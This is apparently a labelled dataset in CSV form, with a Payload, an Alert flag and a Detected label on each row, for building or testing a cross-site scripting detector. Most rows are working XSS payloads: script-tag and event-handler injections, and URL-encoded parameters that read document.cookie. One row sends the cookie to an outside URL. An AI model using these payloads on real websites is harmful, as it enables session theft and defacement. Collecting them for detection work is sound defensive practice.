Payload,Alert,Detected
"<SCRIPT/SRC=""%(jscript)s""></SCRIPT>",False,1
find=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,False,1
"<details onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</details>",False,1
<body language=vbs onload=confirm-1,False,1
from=40&cid=%22%3E%3Cscript%3Ealert(document.cookie)%3C/scr<br/>ipt%3E%3E%3Cmarquee%3E%3Ch1%3Emeloulisi%3C/h1%3E%3C/marquee%3E,False,1
<script>alert(1)</script>.htm,False,1
back=/myordertracking.asp%22%3E%3Cscript%3Ealert(1337)%3C/script%3<br/>E,False,1
"<script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(3700)}),x</script>",False,1
id=1%22%3E%3Cscript%3Ealert%28document.cookie%29%3C<br/>/script%3E,False,1
user=%3Ch1%3EHacked%20by%20Janizary%3C/h1%3E<script>ale<br/>rt(1)</script>,False,1
"<dt id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></dt>",False,1
<--%253cimg%20onerror=alert(1)%20src=a%253e --!>,False,1
"v=""><script>alert(123)</script>",False,1
"searchterms=""><script>alert(document.cookie)<br/></script><h1>www.raptr.us.tc</h1>",False,1
<noframes contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,False,1
lang=en&refurl=%22%22%3E%3E%3Cscript%3Ealert(%22xss%20by%20Bl<br/>ackCode%20:P%20loool%22 )%3C/script%3E%22%22%3E%3E%3C%3C%22%22,False,1
"""><script>alert('THE-SH0CK-B0Y')</script>",False,1
<menuitem onpointerrawupdate=alert(1) style=display:block>XSS</menuitem>,False,1
"<style>:target {color:red;}</style><code id=x style=""transition:color 1s"" ontransitionstart=alert(1)></code>",False,1
<listing onfocus=alert(1) autofocus tabindex=1>,False,1
</option><img src=x onerror=alert(origin)>,False,1
"pt=2&sp=2&ycs=%2BqWEgB7wUAc%3D&qs=06oENya4ZGJbKUjvjwGtnG6lv5viRy7eDPDTOS9W-A4i5B6Eb7<br/>wQL9rBk7gdfqacjQNjjI_Y_0zI2HHPHI08-huHhEzofZpLPMhLhvaj5ooN2zseleNY6O_aj70yQKP2VHFm7L9aSLVEiZBsYMZPIY<br/>spfNlRjvRJdccPwIl6fnT-tg_KnijcoEzGTu_Zbr_5vQSskeF9LpJGrntRRV4B3eFvvnzduHjUySH30QNgAngpVqXKdXE5P8-Y2N<br/>qO6iHrw07J6s1gh0yxpw8vHhHLfMaUy5ZdBzR0yyYgLX0Q..,YT0z&vid=1206254279_1X01X1826228314&rpt=2&kt=1",False,0
http&next=http%3A%2F%2Fxssed.com,False,0
<rb onbeforescriptexecute=alert(1)><script>1</script>,False,1
echo=<script>window.location='http://www.google.com/index.php?cook<br/>ie='%2Bdocument.cookie;</script>,False,1
"<thead oncut=""alert(1)"" contenteditable>test</thead>",False,1
<sVg oNloaD=write()>,False,1
id=1484%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E,False,1
